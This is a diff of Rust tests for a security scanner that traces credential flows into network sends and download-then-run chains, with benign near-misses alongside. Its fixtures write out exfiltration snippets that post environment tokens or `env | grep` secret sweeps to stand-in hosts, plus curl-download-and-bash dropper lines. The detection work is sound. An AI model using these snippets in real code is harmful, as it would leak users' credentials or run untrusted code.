@@ -3401,11 +3401,7 @@ mod reconcile {
     fn chains(filename: &str, contents: &str) -> Vec<Finding> {
         let findings = scan(filename, contents);
         let lines: Vec<&str> = contents.lines().collect();
-        crate::scanner::correlate::apply(
-            &crate::corpus::compiled::corpus().correlation_rules,
-            &findings,
-            &lines,
-        )
+        crate::scanner::correlate::apply_corpus(&findings, &lines)
     }
 
     fn chained(filename: &str, contents: &str, rule: &str) -> Option<Severity> {
@@ -3684,16 +3680,16 @@ mod reconcile {
         assert_eq!(chained("app.py", &header, "EXFIL-CHAIN-001"), None);
     }
 
-    /// The cost, measured on the Datadog selection: artifact-lab-3-package
-    /// (17 versions) binds `data = dict(os.environ)`, encodes it into
-    /// `encoded_data`, and sends `Request(url, data=encoded_data)` beside a
-    /// webhook URL. The word reading linked the keyword `data=` to the
-    /// variable `data`: the right answer by a coincidence of names (the same
-    /// flow with the variable called `env` never linked). The flow is two
-    /// hops, which the one-hop linker does not follow, so the chain is gone;
-    /// NET-007 still reports the webhook host at Critical.
+    /// artifact-lab-3-package (17 versions in the Datadog selection) binds
+    /// `data = dict(os.environ)`, encodes it into `encoded_data`, and sends
+    /// `Request(url, data=encoded_data)` beside a webhook URL. The word
+    /// reading linked the keyword `data=` to the variable `data`: the right
+    /// answer by a coincidence of names. Reading names as values alone lost
+    /// it; following a name assigned from the bound one (`encoded_data`)
+    /// where the word reading linked keeps it, and the same flow under a
+    /// name the send does not repeat (`env`) is not linked, as it never was.
     #[test]
-    fn exfil_chain_does_not_follow_a_two_hop_flow() {
+    fn exfil_chain_follows_a_two_hop_flow_the_word_reading_linked() {
         let sweep = "import os\n\
             import urllib.request\n\
             import urllib.parse\n\
@@ -3707,7 +3703,10 @@ mod reconcile {
             \x20   urllib.request.urlopen(req)\n";
         assert!(fires("setup.py", sweep, "CRED-ENV-001"));
         assert!(severities("setup.py", sweep, "NET-007").contains(&Severity::Critical));
-        assert_eq!(chained("setup.py", sweep, "EXFIL-CHAIN-001"), None);
+        assert_eq!(
+            chained("setup.py", sweep, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
         // Encoded and sent in one statement, the environment is the value.
         let one_hop = sweep.replace(
             "data=encoded_data",
@@ -3717,6 +3716,66 @@ mod reconcile {
             chained("setup.py", &one_hop, "EXFIL-CHAIN-001"),
             Some(Severity::Critical)
         );
+        // With an ordinary host, the chain is what makes it Critical.
+        let plain = "import os\n\
+            import requests\n\
+            from urllib.parse import urlencode\n\
+            \n\
+            data = dict(os.environ)\n\
+            encoded = urlencode(data)\n\
+            requests.post(\"https://collect.example.net/c\", data=encoded)\n";
+        assert_eq!(
+            chained("setup.py", plain, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // The siblings: the keyword or key of the send repeats the source's
+        // name, and a name built from it is what is sent.
+        for (source, hop, send) in [
+            (
+                "json = os.environ.copy()",
+                "payload = {k: v for k, v in json.items()}",
+                "requests.post(u, json=payload)",
+            ),
+            (
+                "params = os.environ[\"SERVICE_TOKEN\"]",
+                "q = {\"t\": params}",
+                "requests.get(u, params=q)",
+            ),
+            (
+                "data = dict(os.environ)",
+                "body = json.dumps(data).encode()",
+                "urllib.request.urlopen(urllib.request.Request(u, data=body))",
+            ),
+        ] {
+            let src = format!(
+                "import os, json, requests, urllib.request\nu = COLLECT\n{source}\n{hop}\n{send}\n"
+            );
+            assert_eq!(
+                chained("setup.py", &src, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{send}"
+            );
+        }
+        let js = "const body = process.env.SERVICE_TOKEN;\n\
+            const payload = JSON.stringify({ v: body });\n\
+            fetch(\"https://collect.example.net/c\", { method: \"POST\", body: payload });\n";
+        assert_eq!(
+            chained("app.js", js, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        let agent = "import subprocess, requests\n\
+            data = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n\
+            encoded = data.encode()\n\
+            requests.post(\"https://metrics.example.dev/collect\", data=encoded)\n";
+        assert_eq!(
+            chained("audit.py", agent, "AGENTSC-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // No link the word reading did not make.
+        let env = plain
+            .replace("data = dict", "env = dict")
+            .replace("urlencode(data)", "urlencode(env)");
+        assert_eq!(chained("setup.py", &env, "EXFIL-CHAIN-001"), None);
     }
 
     #[test]
@@ -3807,6 +3866,374 @@ mod reconcile {
         assert_eq!(
             chained("pkg/infer.py", bundled, "DESER-CHAIN-001"),
             Some(Severity::High)
+        );
+    }
+
+    // -- the attack probes on the value reading, through the full scanner --
+    //
+    // Two review lenses probed the value reading with hand-written files
+    // (synthetic, 268 probes). These are their findings, one test per
+    // class: the true links the first cut lost, and the false links it
+    // kept.
+
+    /// A replacement field sends its expression whatever follows it: a
+    /// format spec, a conversion, Python's self-documenting `=`, or a
+    /// str.format field formatted from `locals()`.
+    #[test]
+    fn chains_link_format_fields_with_a_spec() {
+        let py = |sink: &str| {
+            format!("import os\nimport requests\n\ntoken = os.environ[\"SERVICE_TOKEN\"]\n{sink}\n")
+        };
+        for sink in [
+            "requests.get(f\"https://collect.example.net/c?t={token:s}\")",
+            "requests.get(f\"https://collect.example.net/c?t={token:.200}\")",
+            "requests.get(f\"https://collect.example.net/c?t={token:{width}}\")",
+            "requests.get(f\"https://collect.example.net/c?{token=}\")",
+            "requests.get(f\"https://collect.example.net/c?{token=!r}\")",
+            "requests.post(u, data=f\"leak={token:s}\")",
+            "requests.get(\"https://collect.example.net/c?t={token:s}\".format(**locals()))",
+            "requests.post(\n    u,\n    data=f\"{token:s}\",\n)",
+        ] {
+            assert_eq!(
+                chained("app.py", &py(sink), "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        let agent = "import subprocess, requests\n\
+            secrets = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n\
+            requests.post(\"https://metrics.example.net/collect\", data=f\"{secrets:s}\")\n";
+        assert_eq!(
+            chained("audit.py", agent, "AGENTSC-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        let deser = "import os\n\
+            import torch\n\
+            model_path = os.path.join(os.path.dirname(__file__), \"model.pt\")\n\
+            model = torch.load(f\"{model_path:s}\", weights_only=False)\n";
+        assert_eq!(
+            chained("pkg/infer.py", deser, "DESER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    /// A shell parameter expansion reads the variable whatever modifier it
+    /// carries: `${VAR:-}` (the idiom under `set -u`), `${VAR:?}`,
+    /// `${VAR:0:N}`, `${VAR=x}`, and `$VAR=` inside a word.
+    #[test]
+    fn chains_link_shell_expansions_with_a_modifier() {
+        for expansion in [
+            "${API_KEY:-}",
+            "${API_KEY:?unset}",
+            "${API_KEY:0:64}",
+            "${API_KEY=none}",
+            "$API_KEY=1",
+        ] {
+            let sh = format!(
+                "#!/bin/bash\nset -euo pipefail\nAPI_KEY=\"${{MCP_API_KEY}}\"\ncurl -s -X POST \"https://collect.example.net/c\" \\\n  --data-urlencode \"k={expansion}\"\n"
+            );
+            assert_eq!(
+                chained("run.sh", &sh, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{expansion}"
+            );
+        }
+        let sweep = "#!/bin/sh\n\
+            SECRETS=$(env | grep -E 'TOKEN|SECRET')\n\
+            curl -fsS -X POST https://collect.example.net/c -d \"s=${SECRETS:-none}\"\n";
+        assert_eq!(
+            chained("x.sh", sweep, "AGENTSC-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        let tarball = "#!/bin/sh\n\
+            tar -czf \"$TARBALL\" --exclude=.git --exclude=node_modules .\n\
+            curl -F \"file=@${TARBALL:?}\" https://deploy.example.net/upload\n";
+        assert_eq!(
+            chained("deploy.sh", tarball, "AGENTSC-CHAIN-002"),
+            Some(Severity::High)
+        );
+    }
+
+    /// A bare name before `:` in a Python dict display is a key expression:
+    /// the variable's value is sent as the key. A JavaScript ternary laid
+    /// out with its operators at line ends has the name as an operand.
+    #[test]
+    fn chains_link_python_key_expressions_and_ternary_operands() {
+        for sink in [
+            "requests.post(\"https://collect.example.net/c\", json={token: \"host\"})",
+            "requests.post(\"https://collect.example.net/c\", json={\"a\": 1, token: 2})",
+            "requests.post(\"https://collect.example.net/c\", json={\n    token: \"host\",\n})",
+        ] {
+            let py = format!(
+                "import os\nimport requests\n\ntoken = os.environ[\"SERVICE_TOKEN\"]\n{sink}\n"
+            );
+            assert_eq!(
+                chained("app.py", &py, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        let js = "const token = process.env.SERVICE_TOKEN;\n\
+            axios.post(\"https://collect.example.net/c\", {\n\
+            \x20 data: leak ?\n\
+            \x20   token :\n\
+            \x20   \"x\",\n\
+            });\n";
+        assert_eq!(
+            chained("app.js", js, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // The same object key in JavaScript names a property.
+        let key = "const token = process.env.SERVICE_TOKEN;\n\
+            const gh = new Octokit({ auth: token });\n\
+            axios.post(\"https://api.example.net/login\", { token: \"anonymous\" });\n";
+        assert_eq!(chained("app.js", key, "EXFIL-CHAIN-001"), None);
+    }
+
+    /// The window is the sink's own statement: the next function, a
+    /// docstring, a log line, a query that compares the name, or an export
+    /// list after it is something else.
+    #[test]
+    fn exfil_chain_stops_at_the_end_of_the_call() {
+        let head = "import os\nimport requests\n\nurl = os.environ[\"DATABASE_URL\"]\n\n\n";
+        for rest in [
+            "def health():\n    return requests.get(\"https://status.example.com/health\", timeout=3).ok\n\n\ndef connect(url):\n    return create_engine(url)\n",
+            "def health():\n    r = requests.get(\"https://status.example.com/health\", timeout=3)\n    \"\"\"Rotate the url stored in the vault.\"\"\"\n    return r\n",
+            "def refresh(session, User):\n    feed = requests.get(\"https://feeds.example.com/latest.json\", timeout=5).json()\n    user = session.query(User).filter(User.url == url).first()\n    return feed, user\n",
+            "def fetch(page):\n    r = requests.get(page, timeout=5)\n    log.debug(\"fetched %s\", r.url)\n    return r\n",
+        ] {
+            let src = format!("{head}{rest}");
+            assert!(fires("db.py", &src, "CRED-001"), "{rest}");
+            assert_eq!(chained("db.py", &src, "EXFIL-CHAIN-001"), None, "{rest}");
+        }
+        let js = "const token = process.env.SERVICE_TOKEN;\n\
+            export const gh = new ServiceClient(token);\n\
+            \n\
+            export async function login(form) {\n\
+            \x20 const res = await fetch(\"https://api.example.com/login\", { method: \"POST\", body: form });\n\
+            \x20 const { token } = await res.json();\n\
+            \x20 return token;\n\
+            }\n";
+        assert_eq!(chained("auth.js", js, "EXFIL-CHAIN-001"), None);
+        let exports = "const token = process.env.SERVICE_TOKEN;\n\
+            const health = () => fetch(\"https://status.example.com/health\");\n\
+            module.exports = { token, health };\n";
+        assert_eq!(chained("auth.js", exports, "EXFIL-CHAIN-001"), None);
+        // Across the lines of one call, the value is still read.
+        let multi = format!(
+            "{head}requests.post(\n    \"https://collect.example.net/c\",\n    data={{\"dsn\": url}},\n)\n"
+        );
+        assert_eq!(
+            chained("db.py", &multi, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// A word inside a string literal or a comment is not a use: a token
+    /// endpoint's path, an OAuth grant type, a note on the sink line.
+    #[test]
+    fn exfil_chain_does_not_link_a_word_in_a_string_or_comment() {
+        let py = |sink: &str| {
+            format!(
+                "import os\nimport requests\n\ntoken = os.environ[\"GITHUB_TOKEN\"]\ngh = Github(token)\n\n\ndef call(cid, csecret_value):\n    {sink}\n"
+            )
+        };
+        for sink in [
+            "r = requests.post(\"https://oauth2.example.com/token\", data={\"grant_type\": \"client_credentials\", \"client_id\": cid, \"client_secret\": csecret_value})",
+            "r = requests.post(\"https://login.example.com/oauth\", params={\"response_type\": \"token\"})",
+            "return requests.get(\"https://status.example.com/api/v2/status.json\")  # public: no token needed",
+            "r = requests.post(\"https://login.example.com/oauth\", data=\"{\\\"token\\\": \\\"anonymous\\\"}\")",
+        ] {
+            assert_eq!(chained("oauth.py", &py(sink), "EXFIL-CHAIN-001"), None, "{sink}");
+        }
+        let js = "const token = process.env.SERVICE_TOKEN;\n\
+            const gh = new Octokit({ auth: token });\n\
+            fetch(\"https://status.example.com/health\"); // no token here\n\
+            axios.post(\"https://api.example.com/x\", { /* anon */ token: \"anonymous\" });\n";
+        assert_eq!(chained("a.js", js, "EXFIL-CHAIN-001"), None);
+        // A comment on the source's own line: the credential name there is a
+        // note, not a read.
+        let sh = "#!/bin/sh\n\
+            export MCP_TOKEN=\"$(cat \"$XDG_CONFIG_HOME/app/mcp_token\")\"\n\
+            curl -fsS https://status.example.com/health   # MCP_TOKEN is only for the local server\n";
+        assert!(fires("run.sh", sh, "CRED-MCP-001"));
+        assert_eq!(chained("run.sh", sh, "EXFIL-CHAIN-001"), None);
+        let keyfile = "import os\nimport requests\n\n\
+            with open(os.path.expanduser(\"~/.ssh/id_rsa\")) as keyfile:\n\
+            \x20   fingerprint = sign_local(keyfile.read())\n\
+            \x20   requests.post(\"https://audit.example.com/fp\", json={\"fp\": fingerprint})  # keyfile never leaves the host\n";
+        assert_eq!(chained("s.py", keyfile, "EXFIL-CHAIN-001"), None);
+        // What a string interpolates is sent.
+        let sent = "#!/bin/sh\n\
+            export MCP_TOKEN=\"$(cat \"$XDG_CONFIG_HOME/app/mcp_token\")\"\n\
+            curl -fsS -d \"t=$MCP_TOKEN\" https://collect.example.net/c   # sync\n";
+        assert_eq!(
+            chained("run.sh", sent, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// An attribute of another object (`r.url`) is not the bound `url`; a
+    /// function parameter of the same name is whatever the caller passes.
+    #[test]
+    fn exfil_chain_does_not_link_an_attribute_or_a_shadowing_parameter() {
+        let attr = "import os\nimport requests\n\n\
+            url = os.environ[\"DATABASE_URL\"]\n\
+            engine = create_engine(url)\n\
+            requests.get(page, params={\"next\": r.url})\n";
+        assert_eq!(chained("fetch.py", attr, "EXFIL-CHAIN-001"), None);
+        let js_attr = "const url = process.env.DATABASE_URL;\n\
+            fetch(\"https://api.example.com/items\").then((res) => ({ items: [], next: res.url }));\n";
+        assert_eq!(chained("a.js", js_attr, "EXFIL-CHAIN-001"), None);
+        let head = "import os\nimport requests\n\nurl = os.environ[\"DATABASE_URL\"]\nengine = create_engine(url)\n";
+        for rest in [
+            "\n\ndef ping(url):\n    return requests.get(url + \"/ping\", timeout=3)\n",
+            "ping = lambda url: requests.get(url + \"/ping\", timeout=3)\n",
+            "def verify(url: str) -> bool: return requests.get(\"https://idp.example.com/health\", timeout=3).ok and engine.check(url)\n",
+        ] {
+            let src = format!("{head}{rest}");
+            assert_eq!(chained("db.py", &src, "EXFIL-CHAIN-001"), None, "{rest}");
+        }
+        let ts = "const token = process.env.SERVICE_TOKEN;\n\
+            const client = new ServiceClient(token);\n\
+            export const verify = async (token: string): Promise<boolean> => {\n\
+            \x20 const r = await fetch(\"https://idp.example.com/check\", { method: \"POST\", body: token });\n\
+            \x20 return r.ok;\n\
+            };\n";
+        assert_eq!(chained("api.ts", ts, "EXFIL-CHAIN-001"), None);
+        // Called with the bound value, the parameter is that value.
+        let called = format!(
+            "{head}\n\ndef ping(url):\n    return requests.get(url + \"/ping\", timeout=3)\n\nping(url)\n"
+        );
+        assert_eq!(
+            chained("db.py", &called, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // Outside the function, the name is the bound value again.
+        let after = format!(
+            "{head}\n\ndef strip(url):\n    return url.strip()\n\nrequests.get(\"https://collect.example.net/c\", params={{\"dsn\": url}})\n"
+        );
+        assert_eq!(
+            chained("db.py", &after, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// TypeScript member syntax names a member: an optional parameter, a
+    /// class field, an interface member.
+    #[test]
+    fn exfil_chain_does_not_link_typescript_members() {
+        for member in [
+            "export async function call(path: string, token?: string) {\n  return client.get(path);\n}",
+            "class Api {\n  private token: string;\n}",
+            "export interface Opts { url: string; token: string }",
+        ] {
+            let ts = format!(
+                "const token = process.env.SERVICE_TOKEN;\nconst client = new ServiceClient(token);\n\nexport const health = () => fetch(\"https://status.example.com/health\");\n\n{member}\n"
+            );
+            assert_eq!(chained("api.ts", &ts, "EXFIL-CHAIN-001"), None, "{member}");
+        }
+    }
+
+    /// A download written to a path and a later launch link only when the
+    /// launch *runs* that path: a data file handed to a converter, a path in
+    /// `cwd=` or a comment, or a guard that tests the file is not the
+    /// program.
+    #[test]
+    fn dropper_chain_links_only_the_program_the_launch_runs() {
+        let py = |launch: &str| {
+            format!(
+                "import subprocess\nimport sys\nimport urllib.request\n\ncsv_path = \"data/raw.csv\"\nconvert_script = \"scripts/convert.py\"\nurllib.request.urlretrieve(\"https://data.example.org/raw.csv\", csv_path)\n{launch}\n"
+            )
+        };
+        for launch in [
+            "subprocess.run([sys.executable, convert_script, csv_path], check=True)",
+            "subprocess.run([sys.executable, convert_script, \"--input\", csv_path], check=True)",
+            "subprocess.run([sys.executable, convert_script], cwd=csv_path, check=True)",
+            "subprocess.run([sys.executable, convert_script], check=True)  # reads csv_path",
+        ] {
+            let src = py(launch);
+            assert!(fires("prep.py", &src, "CODE-RUNFILE-001"), "{launch}");
+            assert_eq!(
+                chained("prep.py", &src, "DROPPER-CHAIN-001"),
+                None,
+                "{launch}"
+            );
+        }
+        let runs_it = py("subprocess.run([sys.executable, csv_path], check=True)");
+        assert_eq!(
+            chained("prep.py", &runs_it, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        let sh = "#!/bin/sh\n\
+            curl -fsSL -o \"$CONFIG_FILE\" https://config.example.org/app.conf\n\
+            [ -s \"$CONFIG_FILE\" ] && bash \"$SETUP_SCRIPT\"\n";
+        assert!(fires("setup.sh", sh, "CODE-RUNFILE-001"));
+        assert_eq!(chained("setup.sh", sh, "DROPPER-CHAIN-001"), None);
+        let sh_runs = "#!/bin/sh\n\
+            curl -fsSL -o \"$INSTALLER\" https://get.example.org/install.sh\n\
+            bash \"$INSTALLER\"\n";
+        assert_eq!(
+            chained("setup.sh", sh_runs, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    /// The program operand DROPPER-CHAIN-001 reads is taken from the same
+    /// shapes CODE-RUNFILE-001 matches: a launch the rule reports must have
+    /// an operand the chain can read, or the chain falls back to reading the
+    /// whole launch line.
+    #[test]
+    fn every_launch_the_rule_reports_has_a_program_operand() {
+        for (file, launch) in [
+            ("a.py", "subprocess.run([sys.executable, stage_path])"),
+            (
+                "a.py",
+                "subprocess.Popen([sys.executable, \"/tmp/managed.pyz\"])",
+            ),
+            (
+                "a.py",
+                "subprocess.run([\"python3\", \"-u\", stage_path], check=True)",
+            ),
+            (
+                "a.py",
+                "subprocess.call([\"powershell\", \"-File\", script_path])",
+            ),
+            ("a.py", "os.startfile(installer_path)"),
+            ("a.ps1", "Start-Process \"$installer\" -Wait"),
+            ("a.js", "execFile(installerPath, [], cb)"),
+            ("a.sh", "bash \"$INSTALLER\""),
+            ("a.sh", "[ -s \"$F\" ] && sh \"$SETUP\""),
+        ] {
+            let src = format!("{launch}\n");
+            assert!(fires(file, &src, "CODE-RUNFILE-001"), "{launch}");
+            assert!(
+                !crate::scanner::correlate::launched_operands(launch).is_empty(),
+                "{launch}"
+            );
+        }
+    }
+
+    /// A count of the swept secrets is a number: sent under a key that
+    /// repeats the name, or computed in the send, it is not the secrets.
+    #[test]
+    fn agent_chain_does_not_link_a_count_of_the_secrets() {
+        for send in [
+            "requests.post(\"https://status.example.dev/report\", json={\"count\": len(secrets.splitlines())})",
+            "requests.post(\"https://status.example.dev/report\", json={\"n\": secrets.count(\"\\n\")})",
+        ] {
+            let src = format!(
+                "import subprocess, requests\nsecrets = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n{send}\n"
+            );
+            assert!(fires("audit.py", &src, "AGENTSC-010"), "{send}");
+            assert_eq!(chained("audit.py", &src, "AGENTSC-CHAIN-001"), None, "{send}");
+        }
+        let sent = "import subprocess, requests\n\
+            secrets = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n\
+            requests.post(\"https://metrics.example.dev/collect\", json={\"n\": len(secrets), \"s\": secrets})\n";
+        assert_eq!(
+            chained("audit.py", sent, "AGENTSC-CHAIN-001"),
+            Some(Severity::Critical)
         );
     }
 
